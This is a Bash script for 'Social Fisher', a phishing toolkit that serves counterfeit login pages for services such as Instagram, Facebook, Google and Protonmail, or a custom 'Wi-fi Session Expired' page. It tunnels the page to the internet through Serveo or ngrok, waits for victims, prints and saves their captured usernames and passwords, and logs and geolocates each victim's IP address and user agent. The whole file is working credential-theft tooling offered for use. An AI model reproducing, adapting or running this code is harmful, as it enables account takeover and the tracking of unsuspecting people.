#!/bin/bash

# 
#            --------------------------------------------------
#                          Social Fisher (SocFish)                
#            --------------------------------------------------
#          Copyright (C) <2019>  <Entynetproject (Ivan Nikolsky)>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#    About Author :   
#    Founder   : Entynetproject (Ivan Nikolsky)
#    Site      : http://entynetproject.simplesite.com/
#    Instagram : @entynetproject 
#    Twitter   : @entynetproject
#    Email     : entynetproject@gmail.com
#

trap 'printf "\n";stop;exit 1' 2
clear

printf '\033]2;Social Fisher\a'

dependencies() {

command -v php > /dev/null 2>&1 || { echo -e "\n\e[1;31m[\e[0m-\e[1;31m] Error, php is not installed!\e[0m"; exit; }
command -v curl > /dev/null 2>&1 || { echo -e "\n\e[1;31m[\e[0m-\e[1;31m] Error, curl is not installed!\e[0m"; exit; }

}

menu() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m       \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m GitLab\e[0m      \e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m\n"           
printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m\n"        
printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m GitHub\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollow\e[0m    \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
read -e -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: \e[0m\en' option


if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="facebook"
start1
elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="instafollowers"
start1

elif [[ $option == 10 ]]; then
server="steam"
start1

elif [[ $option == 12 ]]; then
server="yahoo"
start1

elif [[ $option == 13 ]]; then
server="linkedin"
start1

elif [[ $option == 14 ]]; then
server="protonmail"
start1

elif [[ $option == 15 ]]; then
server="wordpress"
start1

elif [[ $option == 16 ]]; then
server="microsoft"
start1

elif [[ $option == 17 ]]; then
server="origin"
start1

elif [[ $option == 11 ]]; then
server="gitlab"
start1

elif [[ $option == 18 ]]; then
server="pinterest"
start1

elif [[ $option == 99 ]]; then
server="create"
createpage
start1

elif [[ $option == 00 ]]; then
exit 1

else
clear
banner
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner() {

printf "\e[1;92m  ____            \e[0m\e[1;77m _____ _     _     \e[0m\n"
printf "\e[1;92m / ___|  ___   ___\e[0m\e[1;77m|  ___(_)___| |__  \e[0m\n"
printf "\e[1;92m \___ \ / _ \ / __|\e[0m\e[1;77m |_  | / __| '_ \ \e[0m\n"
printf "\e[1;92m  ___) | (_) | (__\e[0m\e[1;77m|  _| | \__ \ | | |\e[0m\n"
printf "\e[1;92m |____/ \___/ \___|\e[0m\e[1;77m_|   |_|___/_| |_|\e[0m\n"
printf "\e[1;92m                       \e[0m\e[1;77m                 \e[0m\n"
printf "\e[1;77m     Developed by Entynetproject                \e[0m\n"
printf "\e[1;77m           (\e[0m\e[1;92mIvan Nikolsky\e[0m\e[1;77m)                \e[0m\n"

}

createpage() {
default_cap1="Wi-fi Session Expired!"
default_cap2="Please login again."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Log-In"

read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: \e[0m\e[1;77mWi-fi Session Expired!\e[0m\e[1;92m): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: \e[0m\e[1;77mPlease login again.\e[0m\e[1;92m): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username field (Default: \e[0m\e[1;77mUsername:\e[0m\e[1;92m): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password field (Default: \e[0m\e[1;77mPassword:\e[0m\e[1;92m): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -e -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Submit field (Default: \e[0m\e[1;77mLog-In\e[0m\e[1;92m): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > sites/create/login.html
echo "<html>" >> sites/create/login.html
echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html
printf '</center>' >> sites/create/login.html
printf '<body>\n' >> sites/create/login.html
printf '</html>\n' >> sites/create/login.html


}

catch_cred() {
account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
sleep 0.5
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n"
}


catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[\e[0m*\e[1;92m] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
rm -rf iptracker.log
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for credentials...\e[0m\n"

}


serverx() {
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo -e "\e[1;31m[\e[0m-\e[1;31m] Error, ssh is not installed!\e[0m"; exit; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s \n' $send_link
checkfound


}

startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a port (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_port
read -e port
port="${port:-${default_port}}"
serverx

}


start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi



if [[ -e ngrok ]]; then
sleep 0
else
command -v unzip > /dev/null 2>&1 || { echo -e "\e[1;31m[\e[0m-\e[1;31m] Error, unzip is not installed!\e[0m"; exit; }
command -v wget > /dev/null 2>&1 || { echo -e "\e[1;31m[\e[0m-\e[1;31m] Error, wget is not installed!\e[0m"; exit; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;31m[\e[0m-\e[1;31m] Download failed!\e[0m\n"
exit
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;31m[\e[0m-\e[1;31m] Download failed!\e[0m\n"
exit
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -e -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose portfwd service: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
clear
banner
start1
fi

}
checkfound() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
sleep 0.5
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for IP...\e[0m\n"
sleep 0.6
printf "\e[1;92m[\e[0m+\e[1;92m] IP found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\e[1;92m[\e[0m+\e[0m\e[1;92m] Credentials found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5


done 

}
banner
dependencies
menu
